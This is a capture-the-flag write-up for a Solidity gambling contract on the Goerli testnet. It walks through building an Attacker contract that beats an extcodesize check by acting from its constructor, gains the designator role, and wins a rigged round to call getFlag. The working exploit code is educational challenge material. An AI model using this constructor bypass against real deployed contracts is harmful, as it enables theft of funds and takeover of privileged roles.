# andes (v0rtex)
> Sometimes the house wins. Sometimes you both win. Note: the token must be right-padded to 64 bytes if using Remix and passing as a function parameter.

## Exploration
```sol
pragma solidity ^0.7.6;

contract Andes {
    // designators can designate an address to be the next random
    // number selector
    mapping(address => bool) designators;
    mapping(address => uint256) balances;

    address selector;
    uint8 private nextVal;
    address[8][8] bids;

    event Registered(address, uint256);
    event RoundFinished(address);
    event GetFlag(bytes32);

    constructor() {
        designators[msg.sender] = true;
        _resetBids();
    }

    modifier onlyDesignators() {
        require(designators[msg.sender] == true, "Not owner");
        _;
    }

    function register() public {
        require(balances[msg.sender] < 10);

        balances[msg.sender] = 50;

        emit Registered(msg.sender, 50);
    }

    function setNextSelector(address _selector) public onlyDesignators {
        require(_selector != msg.sender);
        selector = _selector;
    }

    function setNextNumber(uint8 value) public {
        require(selector == msg.sender);

        nextVal = value;
    }

    function _resetBids() private {
        for (uint256 i = 0; i < 8; i++) {
            for (uint256 j = 0; j < 8; j++) {
                bids[i][j] = address(0);
            }
        }
    }

    function purchaseBid(uint8 bid) public {
        require(balances[msg.sender] > 10);
        require(msg.sender != selector);

        uint256 row = bid % 8;
        uint256 col = bid / 8;

        if (bids[row][col] == address(0)) {
            balances[msg.sender] -= 10;
            bids[row][col] = msg.sender;
        }
    }

    function playRound() public onlyDesignators {
        address winner = bids[nextVal % 8][nextVal / 8];

        balances[winner] += 1000;
        _resetBids();

        emit RoundFinished(winner);
    }

    function getFlag(bytes32 token) public {
        require(balances[msg.sender] >= 1000);

        emit GetFlag(token);
    }

    function _canBeDesignator(address _addr) private view returns (bool) {
        uint256 size = 0;

        assembly {
            size := extcodesize(_addr)
        }

        return size == 0 && tx.origin != msg.sender;
    }

    function designateOwner() public {
        require(_canBeDesignator(msg.sender));
        require(balances[msg.sender] > 0);

        designators[msg.sender] = true;
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}
```

Lets also go ahead and run the provided `nc` command to see what it gives us.
```
$ nc -v nile.chall.pwnoh.io 13378
Connection to nile.chall.pwnoh.io (3.132.58.34) 13378 port [tcp/*] succeeded!
Hello! The contract is running at 0xdCAeeeB6b02A2E5FbAe956200f1b88784bE25500 on the Goerli Testnet.
Here is your token id: 0xeeb70a59dfe63fedea6fb49c34e7c606
Are you ready to receive your flag? (y/n)
```

The goal in this smart contract is to call the `win` function with the above token id. If successful, the server will know that GetFlag was successfully emitted from the contract and give us the flag.

## Debugging and running

Head over to [remix.ethereum.org](https://remix.ethereum.org) and you will find an IDE to work on and deploy ethereum smart contracts. For testing and debugging purposes, deploying to a Remix VM will work great. For our final transaction however, we are told it is on the Goerli Testnet and will need some funds. A good option will be to create a [MetaMask](https://metamask.io) wallet, switch to the Goerli Testnet and [get some funds from a faucet](https://goerli-faucet.pk910.de).

## Exploit

But what's in our way? In the getFlag function there is a check to ensure that `balances[msg.sender] >= 1000`, where `msg.sender` is us running the contract. We must have a balance high enough in the contract to be able to call `getFlag`. There seems to be some gambling element in the contracts with the `purchaseBid` and `playRound` functions, which is also consistent with the hint. Lets see if we can play with these functions to get some more funds.

To exploit an ethereum contract we typically want to make a contract of our own. Lets make a very basic one:
```sol
contract Attacker {
    Andes andes;

    constructor(address _andes) {
        andes = Andes(_andes);
    }

    function attack(bytes32 token) public {
        andes.getFlag(token); // this will fail
    }
}
```

This contract accepts as an argument the address of the `Andes` contract. On the final attack this will be the actual address on the Goerli Testnet but for debugging we will deploy the `Andes` contract ourselves. The hint tells us how to get the token so we will follow its advice and pad the token with some simple python.
```python
>>> "0x" + "eeb70a59dfe63fedea6fb49c34e7c606".ljust(64, "0")
'0xeeb70a59dfe63fedea6fb49c34e7c60600000000000000000000000000000000'
```

In order to get a high enough balance to call the `getFlag` function, we will need to win one of the rounds of the bid. But in order to call `playRound` we must be a "designator" and have some balance. Lets see how we can become a "designator"
```sol
modifier onlyDesignators() {
    require(designators[msg.sender] == true, "Not owner");
    _;
}

function playRound() public onlyDesignators {
    address winner = bids[nextVal % 8][nextVal / 8];

    balances[winner] += 1000;
    _resetBids();

    emit RoundFinished(winner);
}

function _canBeDesignator(address _addr) private view returns (bool) {
    uint256 size = 0;

    assembly {
        size := extcodesize(_addr)
    }

    return size == 0 && tx.origin != msg.sender;
}

function designateOwner() public {
    require(_canBeDesignator(msg.sender));
    require(balances[msg.sender] > 0);

    designators[msg.sender] = true;
}
```

There's some pretty suspicious code in `_canBeDesignator`, I wonder what it is about. After some googling I came across this great website overall, and specifically [this article here](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks) which just straight up tells us how to exploit it.

The `extcodesize` is supposed to check if our contract contains code, in which case it is not a user interacting with the contract but rather another smart contract. To bypass this check we just need to put our code into the constructor of our `Attacker` contract. We can also see that by running `register` we can get a balance of 50 which is enough to pass the second check of `designateOwner`.
```sol
contract Attacker {
    Andes andes;

    constructor(address _andes) {
        andes = Andes(_andes);
        andes.register();
        andes.designateOwner();
    }

    function attack(bytes32 token) public {
        andes.playRound();

        andes.getFlag(token);
    }
}
```

Now that we are a designator, we can initiate a `playRound` ourselves. We don't know or control what `nextVal` is, so we can't just win on our first try. To become the `selector` to be able to set the next number is in these functions:
```sol
function setNextSelector(address _selector) public onlyDesignators {
    require(_selector != msg.sender);
    selector = _selector;
}

function setNextNumber(uint8 value) public {
    require(selector == msg.sender);

    nextVal = value;
}
```

To be honest, I don't feel like bypassing these security checks though. We've actually already gathered enough information to beat the contract already. We don't control `nextVal` but it must be some number between 0 and 63, so worst case scenario we can guess and run the contract 64 times on average. But it is actually far easier than that because `nextVal` is the same number across multiple bids and is not changed unless someone else actually has made themselves the selector and set the next number. We can run out attacker contract once with a random guess, then debug the contract to get the persistent value of `nextVal` and run our attack again but this time with the correct value of `nextVal` and get enough funds to get the flag.

Here is the complete attacker contract:
```sol
contract Attacker {
    Andes andes;

    // debug event
    event Balance(uint256);

    constructor(address _andes) {
        andes = Andes(_andes);
        andes.register();
        andes.designateOwner();
    }

    function attack(uint8 bid) public {
        andes.purchaseBid(bid);
        andes.playRound();

        // debug log the current balance
        emit Balance(andes.getBalance());
    }

    function getFlag(bytes32 token) public {
        andes.getFlag(token);
    }
}
```

We are told the `Andes` contract is running at `0xdCAeeeB6b02A2E5FbAe956200f1b88784bE25500` on the Goerli Testnet, so this will be the argument to the constructor of the `Attacker` contract. Then we'll make one attack with a random number, and see if we got lucky and we got a balance of over 1000 (we probably won't). If we don't then we debug the transaction to see what `nextVal` is, and do another attack with the correct value. Then we should have enough funds to call the `getFlag` function with the token `0xeeb70a59dfe63fedea6fb49c34e7c606`, and get the flag.

![solving the challenge in the Remix IDE](solve.webm)
